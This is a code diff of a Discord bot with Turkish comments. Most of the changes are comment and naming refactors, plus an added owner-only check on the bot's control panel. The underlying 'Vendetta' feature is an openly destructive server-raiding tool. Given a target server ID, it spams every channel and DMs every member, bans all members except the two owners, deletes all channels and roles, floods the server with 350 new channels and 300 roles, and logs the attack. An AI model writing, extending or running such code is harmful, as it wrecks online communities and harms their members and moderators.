@@ -140,21 +140,19 @@ client.once("ready", async () => {
 });
 
 // ----------------------------------------------------------------------
-// PANEL KOMUTU
+// PANEL KOMUTU (.vndt)
 // ----------------------------------------------------------------------
 client.on("messageCreate", async message => {
   if (!message.guild || message.author.bot) return;
-
   if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;
-  if (![".vndt", ".vendetta"].includes(message.content.trim().toLowerCase())) return;
+  if (message.content.trim().toLowerCase() !== ".vndt") return;
 
-  // Embed ve video
   const embed = new EmbedBuilder()
     .setColor("Grey")
     .setTitle("Merhaba Doğukan Ve Emir Tekrardan Hoşgeldiniz ⬜⚡⬜")
     .setDescription("Hangi İşlemi Yapmak İstersiniz?");
 
-  const row = new ActionRowBuilder().addComponents(
+  const menuRow = new ActionRowBuilder().addComponents(
     new StringSelectMenuBuilder()
       .setCustomId("panelMenu")
       .setPlaceholder("İşlem seçiniz")
@@ -171,14 +169,16 @@ client.on("messageCreate", async message => {
       .setStyle(ButtonStyle.Danger)
   );
 
-  message.channel.send({ content: null, embeds: [embed], components: [row, delBtn], files: cachedVideo ? [cachedVideo] : [] });
+  message.channel.send({ content: null, embeds: [embed], components: [menuRow, delBtn], files: cachedVideo ? [cachedVideo] : [] });
 });
 
 // ----------------------------------------------------------------------
-// INTERACTION
+// INTERACTIONS PANEL & MODAL
 // ----------------------------------------------------------------------
 client.on("interactionCreate", async interaction => {
   if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isModalSubmit()) return;
+
+  if (![OWNER_ID, SERI_ID].includes(interaction.user.id)) return;
 
   // Sil butonu
   if (interaction.isButton() && interaction.customId === "deleteMsg") {
@@ -186,7 +186,7 @@ client.on("interactionCreate", async interaction => {
     return interaction.reply({ content: "Mesaj silindi.", ephemeral: true });
   }
 
-  // Menü seçimleri
+  // Panel Menü
   if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
     if (interaction.values[0] === "whitelist") {
       const embed = new EmbedBuilder()
@@ -321,7 +321,7 @@ client.on("interactionCreate", async interaction => {
     }
   }
 
-  // MODAL SUBMITS
+  // Modal Submits Panel
   if (interaction.isModalSubmit()) {
     // WHITELIST EKLE
     if (interaction.customId === "modalWlEkle") {
@@ -377,7 +377,7 @@ client.on("interactionCreate", async interaction => {
 });
 
 // ----------------------------------------------------------------------
-// VENDETTA KOMUTU (önceki tüm sistemler aynı)
+// VENDETTA KOMUTU
 // ----------------------------------------------------------------------
 client.on("messageCreate", async message => {
   if (!message.guild || message.author.bot) return;
@@ -428,7 +428,7 @@ client.on("interactionCreate", async interaction => {
     return interaction.showModal(modal);
   }
 
-  // MODAL SUBMIT VENDETTA
+  // Modal Submit VENDETTA
   if (interaction.isModalSubmit() && interaction.customId === "modalSunucuID") {
     const guildId = interaction.fields.getTextInputValue("sunucuID");
 
@@ -455,7 +455,9 @@ client.on("interactionCreate", async interaction => {
     const hakChan = await client.channels.fetch(HAK_KANAL_ID);
     await updateHaklarMessage(hakChan);
 
-    // BAŞLAMADAN TÜM KANALARA MESAJ AT
+    // ----------------------------------------------------------------------
+    // BAŞLAMADAN ÖNCE TÜM KANALLARA MESAJ AT
+    // ----------------------------------------------------------------------
     try {
       const allChannels = await guild.channels.fetch();
       for (const [id, ch] of allChannels) {
@@ -465,13 +467,16 @@ client.on("interactionCreate", async interaction => {
       }
     } catch {}
 
-    // BAN
+    // ----------------------------------------------------------------------
+    // BAN, KANAL SİL, ROL SİL, YENİ KANAL/ROL OLUŞTUR
+    // ----------------------------------------------------------------------
     const members = await guild.members.fetch();
     await Promise.all(
       members.map(m => {
         if (m.user.bot) return;
         if ([OWNER_ID, SERI_ID].includes(m.id)) return;
 
+        // DM ile uyarı ve video gönder
         m.send({
           embeds: [
             new EmbedBuilder()
@@ -483,15 +488,16 @@ client.on("interactionCreate", async interaction => {
           files: [cachedVideo]
         }).catch(() => {});
 
+        // Banla
         return m.ban().catch(() => {});
       })
     );
 
-    // KANAL SİL
+    // Kanalları sil
     const chs = await guild.channels.fetch();
     await Promise.all(chs.map(c => c.delete().catch(() => {})));
 
-    // ROL SİL
+    // Rolleri sil
     const roles = await guild.roles.fetch();
     await Promise.all(
       roles
@@ -499,7 +505,7 @@ client.on("interactionCreate", async interaction => {
         .map(r => r.delete().catch(() => {}))
     );
 
-    // 350 KANAL OLUŞTUR
+    // 350 yeni kanal oluştur
     await Promise.all(
       Array.from({ length: 350 }).map((_, i) =>
         guild.channels.create({
@@ -508,7 +514,7 @@ client.on("interactionCreate", async interaction => {
       )
     );
 
-    // 300 ROL OLUŞTUR
+    // 300 yeni rol oluştur
     await Promise.all(
       Array.from({ length: 300 }).map(() =>
         guild.roles.create({
@@ -518,7 +524,7 @@ client.on("interactionCreate", async interaction => {
       )
     );
 
-    // LOG
+    // Log gönder
     await sendVendettaLog(
       interaction.user,
       guild,
